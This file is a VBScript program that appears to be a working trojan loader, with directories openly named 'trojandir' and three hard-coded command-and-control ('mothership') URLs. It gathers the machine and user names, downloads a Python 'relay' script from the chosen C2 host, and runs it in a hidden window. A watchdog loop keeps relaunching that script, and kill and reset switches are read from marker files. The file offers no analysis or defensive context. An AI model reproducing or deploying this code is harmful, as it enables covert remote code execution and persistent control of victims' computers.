Option Explicit
On Error Resume Next

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")

Function LogErr()
    If Err.Number = 0 Then
        Exit Function
    End IF
    
    Call LogMsg("Err.Number=" & Hex(Err.Number))
    Call LogMsg("Err.Description=" & Err.Description)
    Call LogMsg("Err.Source=" & Err.Source)
End Function

Function WriteFile(fpath, msgstr)

    If XIsEmpty(fpath) Then
        Exit Function
    End If
    
    If XIsEmpty(msgstr) Then
        msgstr = ""
    End If
    
    Call LogMsg("WriteFile " & fpath)
    
    Const ForWriting = 2
    Const CreateIfNotExist = True

    Dim oFile : Set oFile = fso.OpenTextFile(fpath, ForWriting, CreateIfNotExist)

    oFile.Write msgstr

    oFile.Close
    Set oFile = Nothing

End Function

Function XIsEmpty(str)
   
    XIsEmpty = False
    
    If IsNull(str) Or IsEmpty(str) Or Len(Trim(str)) = 0 Then
        XIsEmpty = True   
    End If
    
End Function

Function IsWScript()
    If InStr(LCase(WScript.FullName), "cscript.exe") Then
        IsWScript = false
    Else
        IsWScript = true
    End If
End Function

Function LogMsg(msg)
    
    If XIsEmpty(msg) Then
        Exit Function
    End If
    
    If Not IsWScript() Then
        WScript.Echo msg
    End If

    If Not logfObj is Nothing Then
        logfObj.WriteLine msg
    End If
    
End Function

Function GetProcessList()
    Dim list : Set list = CreateObject("Scripting.Dictionary")
    
    Set GetProcessList = list
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("SELECT Name, ProcessId FROM Win32_Process")

    Dim i : i = 0

    Dim item
    For Each item In colItems
    
        Dim myArray : myArray = Array(item.Name, item.ProcessId)

        list.Add i, myArray

        i = i + 1
    Next

    Set GetProcessList = list
End Function

Function GetTimestamp()
    Dim d, ts
    d = Now
    ts = Year(d) & _
         Right("0" & Month(d), 2) & _
         Right("0" & Day(d), 2) & _
         Right("0" & Hour(d), 2) & _
         Right("0" & Minute(d), 2) & _
         Right("0" & Second(d), 2)

    GetTimestamp = ts
End Function

Function DownloadFile(sURL, sFile)
    DownloadFile = False

    If XIsEmpty(sURL) or XIsEmpty(sFile) Then
        Exit Function
    End If
    
    logfObj.WriteLine("DownloadFile: " & sURL & " " & sFile & " " & GetTimestamp())

    Dim objHTTP, objStream
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", sURL, False
    objHTTP.Send
    
    If objHTTP.Status <> 200 Then
        Call LogMsg("DownloadFile: " & objHTTP.Status & " " & objHTTP.StatusText )
    End If
    

    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg("DownloadFile: ResponseBody is empty")

        DownloadFile = false
        Exit Function
    End If
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' adTypeBinary
    objStream.Open

    
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
    Call LogMsg("DownloadFile: header: " & allHeadersstr)

    Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

    Call LogMsg("DownloadFile: ResponseBody bytes: " & allHeadersstr)

    objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
    objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
    
    Dim xlmsg
    If Err.Number <> 0 Then
        xlmsg = "Error " & Err.Number & ": " & Err.Description & " " & Err.Source
        
        logfObj.WriteLine(xlmsg)

        Err.Clear 
    End If


    objStream.Close
    Set objStream = Nothing
    Set objHTTP = Nothing
    
    DownloadFile = true
End Function

Function URLEncode(ByVal str)
    URLEncode = ""
    
    If XIsEmpty(str) Then
        Exit Function
    End If
    
    Dim i, kchar, code, result
    result = ""
    
    For i = 1 To Len(str)
        kchar = Mid(str, i, 1)
        code = Asc(kchar)
        
        If (code >= 48 And code <= 57) Or _
           (code >= 65 And code <= 90) Or _
           (code >= 97 And code <= 122) Then
            result = result & kchar
        Else
            result = result & "%" & Hex(code)
        End If
    Next
    
    URLEncode = result
    
End Function

Function GetRandom(n)
    Randomize

    Dim min, max, randomNumber

    min = 10000000
    max = 99999999

    GetRandom = ""
    
    Do While Len(GetRandom) < n
        GetRandom = GetRandom & CStr(Int((max - min + 1) * Rnd + min))
    Loop

End Function

Function IsEightDigitInteger(strValue)
    Dim regEx
    Set regEx = New RegExp
    ' Pattern: ^ (start), \d{8} (exactly 8 digits), $ (end)
    regEx.Pattern = "^\d{8}$"
    IsEightDigitInteger = regEx.Test(strValue)
End Function

Function Reset(fpath)
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If

    Call LogMsg("Reset: " & fpath)
    
    fpath = Trim(fpath)
       
    Dim fileObj : Set fileObj = fso.CreateTextFile(fpath, True)
    
    fileObj.Close
    Set fileObj = Nothing

End Function

Function ReadClientId(clientidpath)
    
    Dim objFile
    ReadClientId = "zzwwxxyy"
    
    If XIsEmpty(clientidpath) Then
        Exit Function
    End If
    
    clientidpath = Trim(clientidpath)

    Call LogMsg("ReadClientId: " & clientidpath)
    
    If Not fso.FileExists(clientidpath) Then
        Call LogMsg("ReadClientId clientid file does not exist")
        Exit Function
    End If
    
    set objFile = fso.OpenTextFile(clientidpath, 1)
    
    Dim clientidstr : clientidstr = objFile.ReadLine

    clientidstr = Replace(Replace(clientidstr, vbCr, ""), vbLf, "")
    clientidstr = Trim(clientidstr)
        
    If IsEightDigitInteger(clientidstr) Then
        ReadClientId = CStr(clientidstr)
    End If
    
    objFile.Close
    Set objFile = Nothing

    Call LogMsg("ReadClientId: " & ReadClientId)

End Function

Function TryReadTag(tagpath)
    
    TryReadTag = ""
    
    If XIsEmpty(tagpath) Then
        Exit Function
    End If
    
    tagpath = Trim(tagpath)
    
    If Not fso.FileExists(tagpath) Then             
        Exit Function
    End If
    
    Dim objFile : set objFile = fso.OpenTextFile(tagpath, 1)

    TryReadTag = objFile.ReadLine

    TryReadTag = Replace(Replace(TryReadTag, vbCr, ""), vbLf, "")
    TryReadTag = Trim(TryReadTag)
           
    objFile.Close
    Set objFile = Nothing

End Function

Function ExecShellAsync(cmdstr)
    Call LogMsg("ExecShell: " & cmdstr)
    
    Const HIDDEN_WINDOW = 0
    Dim strComputer : strComputer = "."
    Dim strCommand: strCommand = cmdstr

    Dim objWMIService: Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim objStartup: Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Dim objConfig: Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW

    Dim objProcess: Set objProcess = objWMIService.Get("Win32_Process")

    Dim intPID
    Dim intReturn : intReturn = objProcess.Create(strCommand, Null, objConfig, intPID)

    If intReturn = 0 Then
        logfObj.WriteLine "Process started successfully. PID: " & intPID
    Else
        logfObj.WriteLine "Process failed to start with error code: " & intReturn
    End If

    Call LogMsg("pid: " & CStr(intPID))
    
    ExecShellAsync = intPID
End Function

Function RunShell(cmdstr, sync)
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("runshell: " & cmdstr)
    
    Dim intReturn : intReturn = WshShell.Run(cmdstr, 0, sync)

    If Err.Number <> 0 Then
        logfObj.WriteLine "runshell: Err.Number: " & Err.Number
        logfObj.WriteLine "runshell: Err.Source: " & Err.Source
        logfObj.WriteLine "runshell: Err.Description: " & Err.Description

        Err.Clear
    End If

    Call LogMsg("runshell: intReturn: " & CStr(intReturn))

    If intReturn = 0 Then
        RunShell = true
    Else
        RunShell = false
    End If
End Function

Function ToTaskTime(startTime)
    
    ' Dim startTime : startTime = Now
    
    ToTaskTime = Year(startTime) & "-" & _
        Right("0" & Month(startTime), 2) & "-" & _
        Right("0" & Day(startTime), 2) & "T" & _
        Right("0" & Hour(startTime), 2) & ":" & _
        Right("0" & Minute(startTime), 2) & ":00"
        
End Function

Function CreateTaskXML(taskname, taskxmlpath)
    Dim strCommand : strCommand = "schtasks /create /XML " & dq & taskxmlpath & dq  &" /tn " & dq & taskname & dq & " /F"
    
    Dim ret : ret = RunShell(strCommand, True)
    
    CreateTaskXML = ret
End Function

Function GetScripTag()
    Dim objDict : Set objDict = CreateObject("Scripting.Dictionary")

    objDict.Add "clientid", clientid
    objDict.Add "script_version", script_version
    objDict.Add "source", source
    objDict.Add "scriptts", scriptts
    objDict.Add "machinename", machinename
    objDict.Add "username", username
    
    Set GetScripTag = objDict
End Function

Function GetScripTagStr()
    GetScripTagStr = ""
    
    Dim scripttag : Set scripttag = GetScripTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

    For Each strKey In keys
        GetScripTagStr = GetScripTagStr & "[" & strKey & "]=[" & scripttag.Item(strKey) & "]|"
    Next

End Function

Function GetScripTagStrUrl()
    GetScripTagStrUrl = ""
    
    Dim scripttag : Set scripttag = GetScripTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

    For Each strKey In keys
        GetScripTagStrUrl = GetScripTagStrUrl & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
    Next

End Function

Function GetScriptPID()
    Call LogMsg("GetScriptPID")

    GetScriptPID = -1
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

    Dim strUniqueTitle : strUniqueTitle = "GetPID_" & Timer()
    Dim strCommand : strCommand = "cmd.exe /c title " & strUniqueTitle & " & timeout 5"

    wshShell.Run strCommand, 0, False
    WScript.Sleep 100 

    Dim strQuery : strQuery = "SELECT ParentProcessId FROM Win32_Process WHERE CommandLine LIKE '%" & strUniqueTitle & "%'"
    Dim colItems : Set colItems = objWMIService.ExecQuery(strQuery)

    Dim objItem
    For Each objItem In colItems
        GetScriptPID = objItem.ParentProcessId
    Next

    Call LogMsg("GetScriptPID: pid=" & CStr(GetScriptPID))
End Function

Function GetProcessName(pid)
    Call LogMsg("GetProcessName: " & CStr(pid))
    
    GetProcessName = ""

    Dim list : Set list = GetProcessList()

    Dim i
    
    For i = 0 to list.Count
        Dim proc : proc = list.Item(i)
        
        if ( proc(1) = pid ) then
            GetProcessName = proc(0)
            Call LogMsg("GetProcessName: procname=" & GetProcessName)

            Exit Function
        End If
        
    Next
    
End Function

Function GetLocalUsers()
    GetLocalUsers = ""
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")

    Dim isempty : isempty = False
    
    If colItems Is Nothing Then
        isempty = True
    ElseIf colItems.Count = 0 Then
        isempty = True
    End IF
    
    If isempty Then
        Exit Function
    End IF
    
    Dim objItem
    For Each objItem in colItems
        GetLocalUsers = GetLocalUsers & objItem.Name & "|"
    Next

End Function

Function FileExists(dirpath, fname)

    FileExists = False
    
    If fso.FolderExists(dirpath) Then
        Dim folder : Set folder = fso.GetFolder(dirpath)
        
        Dim file
        For Each file In folder.Files 
            If LCase(file.Name) = LCase(fname) Then
                FileExists = True
                Exit Function
            End If
        Next
        
    End If
    
End Function

Function GetScriptPID()
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

    Dim strUniqueTitle : strUniqueTitle = "GetPID_" & Timer()
    Dim strCommand : strCommand = "cmd.exe /c title " & strUniqueTitle & " & timeout 10"

    wshShell.Run strCommand, 0, False
    WScript.Sleep 100 

    Dim strQuery : strQuery = "SELECT ParentProcessId FROM Win32_Process WHERE CommandLine LIKE '%" & strUniqueTitle & "%'"
    Dim colItems : Set colItems = objWMIService.ExecQuery(strQuery)

    Dim objItem
    For Each objItem In colItems
        GetScriptPID = objItem.ParentProcessId
    Next

End Function

Function TryWriteText(fpath, txtstr)
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(fpath) Then
        Exit Function
    End IF
    
    If XIsEmpty(txtstr) Then
        txtstr = ""
    End IF
    
    Call LogMsg("TryWriteText: " & fpath & " " & txtstr)
    
    Dim fobj : Set fobj = fso.OpenTextFile(fpath, 2, True)

    If not fobj is nothing Then
        fobj.WriteLine txtstr
        fobj.Close
        Set fobj = Nothing
    Else
        Call RunShell("cmd /c echo " & txtstr & " > " & fpath, true)
    End IF
    
    Err.Clear
    
End Function

' -------

Dim dq : dq = Chr(34)
Dim tempPath : tempPath = fso.GetSpecialFolder(2)

Dim mothershipmaster : mothershipmaster = "https://seashell-raven-793508.hostingersite.com"
Dim mothershipbackup : mothershipbackup = "https://darksalmon-crow-356809.hostingersite.com"
Dim mothershipping : mothershipping = "http://s1083932807.online-home.ca"
Dim mothership : mothership = mothershipbackup

Randomize
Dim randomNumber : randomNumber = Int((100 * 1 + 1) * Rnd + 1)

If randomNumber <= 33 Then
    mothership = mothershipbackup
ElseIf randomNumber > 33 and randomNumber <= 66 Then
    mothership = mothershipping
Else
    mothership = mothershipmaster
End If

Dim scriptpid : scriptpid = -1
Dim scriptts : scriptts = GetTimestamp()
Dim clientid : clientid = "abcdwxyz"
Dim source : source = WScript.ScriptName
Dim scriptpath : scriptpath = WScript.ScriptFullName
Dim machinename : machinename = "LOCALHOST"
Dim username : username = "UNKNOWNUSER"

If Not objNetwork Is Nothing Then
    machinename = objNetwork.ComputerName
    username = objNetwork.UserName
End If

Dim watchdogtimedelay : watchdogtimedelay=15

Dim cmdname : cmdname = "relay"
Dim runnername : runnername = "start_" & cmdname
Dim trojandir :  trojandir = tempPath & "\owd" 
Dim workdir : workdir = trojandir & "\" & cmdname
Dim pythonpath : pythonpath = ""

Dim istpl : istpl = false
If LCase(Mid(machinename, 1, 5)) = LCase("RLPCP") Then
    istpl = True
    
    trojandir = "C:\ProgramData\OWD"
    workdir = trojandir & "\" & "relay"
End IF

Dim relayscriptfname : relayscriptfname = "relay.py"
Dim relayscriptpath : relayscriptpath = workdir & "\" & relayscriptfname					   

Dim logfpath: logfpath = workdir & "\" & "master_" & source & "_" & scriptts & ".log"
Dim logfObj : Set logfObj = fso.OpenTextFile(logfpath, 8, True)

' --------

Function TryDeleteFile(fpath)
    Call LogMsg("TryDeleteFile: " & fpath)
    
    If fso.FileExists(fpath) Then
        fso.DeleteFile fpath, true
    End If
    
    If fso.FileExists(fpath) Then
        Call RunShell("cmd /c del /F /Q " & fpath, True)
    End If
    
End Function

Function Init()
    Call LogMsg("starting " & source & " " & scriptts )
    scriptpid = GetScriptPID()
    
	Call TryDeleteFile(workdir & "\" & "start_relay_running")

    If scriptpid > 0 Then
        Call LogMsg("scriptpid: " & CStr(scriptpid))
        Call TryWriteText(workdir & "\" & "start_relay_running", scriptpid)
    End IF
    
    If Not fso.FolderExists(workdir) Then
        fso.CreateFolder(workdir)
    End If

    WshShell.CurrentDirectory = workdir
    
	Call TryDeleteFile(workdir & "\" & "relay_running")
	
    clientid = ReadClientId(trojandir & "\" & "client_id")
    
    If XIsEmpty(clientid) Then
        Call LogMsg("fatal error -- could not read client id")
        WScript.Quit(1)
    End IF
    
    pythonpath = TryReadTag(trojandir & "\" & "python_path")
    mothership = TryReadTag(trojandir & "\" & "mothership")
    
    If XIsEmpty(pythonpath) Then
        pythonpath = trojandir & "\" & "python\work\Portable Python-3.10.5 x64\App\Python"
    End IF
    
    If Not fso.FolderExists(pythonpath) Then
        Call LogMsg("fatal error -- pythonpath does not exist "& pythonpath)
        WScript.Quit(1)
    End If
    
    If Not fso.FileExists(relayscriptpath) Then
        Call DownloadFile(mothership & "/ow/assets/" & relayscriptfname, relayscriptpath)
    End IF

    Call Watchdog()
    
    LogMsg("Init finished -- exiting")
    WScript.Quit(0)
    
End Function

Init()

LogMsg("fatal error -- exiting")
WScript.Quit(1)

' --------

Function Watchdog()
    ForceSingleton(runnername)
    
    Do While True 
        
        Call LogMsg("Watchdog: starting runner " & runnername & " -- " & GetTimestamp())        
    
    Do While True
    
        Call ExitRamp(cmdname)
        Call ExitRamp(runnername)

        Call ActivateCmd(cmdname)        

        Exit Do
    
    Loop

        Call LogMsg("Watchdog sleeping " & GetTimestamp() )
        
        WScript.Sleep watchdogtimedelay*1000

    Loop
    
End Function

Function ForceSingleton(tcmdname)
    Call LogMsg("ForceSingleton: starting")
    
    Dim scriptpid : scriptpid = GetScriptPID()
    
    Dim scriptprocname : scriptprocname = GetProcessName(scriptpid)
    
    Call LogMsg("ForceSingleton: scriptpid=" & scriptpid)
     
    Dim tagfpath : tagfpath = workdir & "\" & tcmdname & "_running"
    
    If Not fso.FileExists(tagfpath) Then
        Call LogMsg("ForceSingleton: writing to running file")

        Call WriteFile(tagfpath,CStr(scriptpid))
        
        Exit Function
    End If
    
    Call LogMsg("ForceSingleton: running file exists")

    Dim procname : procname = ""
    Dim pid : pid = IsCmdRunning(cmdname, procname)

    Call LogMsg("ForceSingleton -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
    
    If pid > 0 and scriptpid <> pid Then
        Call LogMsg("ForceSingleton: duplicate found -- exiting")
        WScript.Quit(1)
    End If
                
    Call LogErr()
    Call LogMsg("ForceSingleton finished")
End Function

Function ExitRamp(tcmdname)
    LogMsg("ExitRamp: " & tcmdname)
    
    If fso.FileExists(workdir & "\" & "killall") Then
        LogMsg("kill all found -- exiting")
        WScript.Quit(1)
    End If

    Dim resetfname : resetfname = workdir & "\" & "reset_" & tcmdname & "loop"
    
    IF fso.FileExists(resetfname) Then
        Call TryDeleteFile(resetfname)
        
        LogMsg("reset found -- exiting")
        WScript.Quit(1)
    End If

End Function

Function GetCmdPid(tcmdname)
    GetCmdPid = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF
    
    Dim runningpath : runningpath = workdir & "\" & tcmdname & "_running"
    
    Dim objFile

    If fso.FileExists(runningpath) Then
        Set objFile = fso.OpenTextFile(runningpath , 1)
    Else
        Exit Function
    End If

    Dim strContent: strContent = objFile.ReadAll

    strContent = Trim(strContent)
    strContent = Replace(strContent, " ", "")
    strContent = Replace(Replace(Replace(strContent, vbCr, ""), vbLf, ""), vbTab, "")

    GetCmdPid = CInt(strContent)
    
    objFile.Close
    Set objFile = Nothing
    
End Function

Function ReadCmdPid(tcmdname)
    If XIsEmpty(tcmdname) Then
        Exit Function
    End If
    
    Call LogMsg("ReadCmdPid " & tcmdname)
    
    ReadCmdPid = -1
    
    If XIsEmpty(tcmdname) Then
        Exit Function
    End IF
    
    Dim tagfpath : tagfpath = workdir & "\" & tcmdname & "_running"
    
    If Not fso.FileExists(tagfpath) Then        
        Call LogMsg("ReadCmdPid " & tcmdname & " running file does not exist -- exiting function")

        Exit Function
    End If
    
    ReadCmdPid = ReadTag(tagfpath)
    
    ReadCmdPid = CInt(ReadCmdPid)

    Call LogMsg("ReadCmdPid pid=" & ReadCmdPid)

End Function

Function IsCmdRunning(tcmdname, ByRef tprocname)
    
    Call LogMsg("IsCmdRunning -- " & tcmdname)
    tprocname = ""
    
    IsCmdRunning = -1

    Dim list
    Set list = GetProcessList()
    
    If list Is Nothing Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    If list.Count = 0 Then
        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
        Exit Function
    End IF
    
    Dim cmdpid : cmdpid = ReadCmdPid(tcmdname)
    
    Call LogMsg("IsCmdRunning: scanning for pid=" & CStr(cmdpid))

    If Not cmdpid > 0 Then
        Call LogMsg("IsCmdRunning cmdpid negative -- exiting function")
        Exit Function
    End If
    
    Dim itemKey
    Dim item
    For Each itemKey in list
        item = list.Item(itemKey)

        Dim procname : procname = item(0)       
        Dim pid : pid = item(1)
        
        If ( pid = cmdpid ) Then
            IsCmdRunning = pid
            tprocname = procname
            
            Call LogMsg("IsCmdRunning found matching pid=" & CStr(pid) & " procname=" & procname & " exiting function")
            
            Exit Function
        End IF

    Next

    Call LogMsg("IsCmdRunning failed to find match")
    
End Function

Function ExecPython()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("ExecPython -- starting")
    
    ExecPython = -1
    
    Dim pythonexepath : pythonexepath = pythonpath & "\" & "python.exe"        
    
    If Not fso.FileExists(pythonexepath) Then
        Call LogMsg("ExecPython: python exe not found at " & pythonexepath)
        Exit Function
    End IF
    
    Call LogMsg("ExecPython: running exe path: " & pythonexepath)
    
    ExecPython = ExecShellAsync(pythonexepath & " " & relayscriptpath)
        
    If Not ExecPython > 0 Then
        Call LogMsg("ExecPython: failed to start python -- no pid returned")
        Exit Function
    End IF
    
    Dim cmdpidfpath : cmdpidfpath = workdir & "\" & cmdname & "_running"

    Call TryDeleteFile(cmdpidfpath)

    Call TryWriteText(cmdpidfpath, CStr(ExecPython))

    Call LogErr()
    Call LogMsg("ExecPython finished")

End Function

Function ActivateCmd(tcmdname)       
    ActivateCmd = -1

    If XIsEmpty(tcmdname) Then
        Exit Function
    End If

    Call LogMsg("ActivateCmd: " & tcmdname)

    Dim pexist : pexist = false
    
    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, procname)
    
    ' procname should be python.exe
    
    If cmdpid > 0 Then
        Call LogMsg("ActivateCmd: command is running with pid " & cmdpid & " procname: " & procname)
        
        pexist = true
        ActivateCmd = cmdpid
    End If
    
    If Not pexist Then
        Call LogMsg("ActivateCmd: command is not running -- starting it up")
    
        ActivateCmd = ExecPython()
    End If
    
End Function